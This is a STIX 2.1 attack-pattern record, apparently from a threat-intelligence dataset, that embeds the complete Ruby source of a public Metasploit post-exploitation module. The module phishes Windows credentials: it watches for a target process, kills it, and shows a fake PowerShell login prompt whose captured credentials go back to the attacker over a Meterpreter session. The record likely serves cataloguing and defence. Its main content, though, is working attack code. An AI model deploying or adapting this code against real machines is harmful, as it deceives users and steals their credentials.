{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c672d6c-4f5e-426f-ac78-aa9da5fd2972",
    "created": "2024-08-14T16:33:05.014697Z",
    "modified": "2024-08-14T16:33:05.014701Z",
    "name": "Windows Gather User Credentials (phishing)",
    "description": " This module is able to perform a phishing attack on the target by popping up a loginprompt. When the user fills credentials in the loginprompt, the credentials will be sent to the attacker. The module is able to monitor for new processes and popup a loginprompt when a specific process is starting. Tested on Windows 7.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/phish_windows_credentials.rb",
            "external_id": "phish_windows_credentials.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://forsec.nl/2015/02/windows-credentials-phishing-using-metasploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather User Credentials (phishing)',\n        'Description' => %q{\n          This module is able to perform a phishing attack on the target by popping up a loginprompt.\n          When the user fills credentials in the loginprompt, the credentials will be sent to the attacker.\n          The module is able to monitor for new processes and popup a loginprompt when a specific process is starting. Tested on Windows 7.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Wesley Neelen <security[at]forsec.nl>', # Metasploit module, @wez3forsec on Twitter\n          'Matt Nelson' # Original powershell script, @enigma0x3 on Twitter\n        ],\n        'References' => [ 'URL', 'https://forsec.nl/2015/02/windows-credentials-phishing-using-metasploit' ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('PROCESS', [ false, 'Prompt if a specific process is started by the target. (e.g. calc.exe or specify * for all processes)' ]),\n        OptString.new('DESCRIPTION', [ true, 'Message shown in the loginprompt', '{PROCESS_NAME} needs your permissions to start. Please enter user credentials']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])\n      ]\n    )\n  end\n\n  # Function to run the InvokePrompt powershell script\n  def execute_invokeprompt_script(description, process, path)\n    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'Invoke-LoginPrompt.ps1'))\n    if process.nil?\n      sdescription = description.gsub('{PROCESS_NAME} needs your permissions to start. ', '')\n      psh_script = base_script.gsub('R{DESCRIPTION}', sdescription.to_s) << 'Invoke-LoginPrompt'\n    else\n      sdescription = description.gsub('{PROCESS_NAME}', process)\n      psh_script2 = base_script.gsub('R{DESCRIPTION}', sdescription.to_s) << 'Invoke-LoginPrompt'\n      psh_script = psh_script2.gsub('R{START_PROCESS}', \"start-process \\\"#{path}\\\"\")\n    end\n    compressed_script = compress_script(psh_script)\n    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])\n    while (d = cmd_out.channel.read)\n      print_good(d.to_s)\n    end\n  end\n\n  # Function to monitor process creation\n  def procmon(process, description)\n    procs = []\n    existingProcs = []\n    detected = false\n    first = true\n    print_status('Monitoring new processes.')\n    while detected == false\n      sleep 1\n      procs = client.sys.process.processes\n      procs.each do |p|\n        if (p['name'] == process) || (process == '*')\n          if first == true\n            print_status(\"#{p['name']} is already running. Waiting on new instances to start\")\n            existingProcs.push(p['pid'])\n          elsif !existingProcs.include? p['pid']\n            print_status(\"New process detected: #{p['pid']} #{p['name']}\")\n            killproc(p['name'], p['pid'], description, p['path'])\n            detected = true\n          end\n        end\n      end\n      first = false\n    end\n  end\n\n  # Function to kill the process\n  def killproc(process, pid, description, path)\n    print_status('Killing the process and starting the popup script. Waiting on the user to fill in his credentials...')\n    client.sys.process.kill(pid)\n    execute_invokeprompt_script(description, process, path)\n  end\n\n  # Main method\n  def run\n    process = datastore['PROCESS']\n    description = datastore['DESCRIPTION']\n\n    # Powershell installed check\n    if have_powershell?\n      print_good('PowerShell is installed.')\n    else\n      fail_with(Failure::Unknown, 'PowerShell is not installed')\n    end\n\n    # Check whether target system is locked\n    locked = client.railgun.user32.GetForegroundWindow()['return']\n    if locked == 0\n      fail_with(Failure::Unknown, 'Target system is locked. This post module cannot start the loginprompt when the target system is locked.')\n    end\n\n    # Switch to check whether a specific process needs to be monitored, or just show the popup immediatly.\n    case process\n    when nil\n      print_status('Starting the popup script. Waiting on the user to fill in his credentials...')\n      execute_invokeprompt_script(description, nil, nil)\n    else\n      procmon(process, description)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}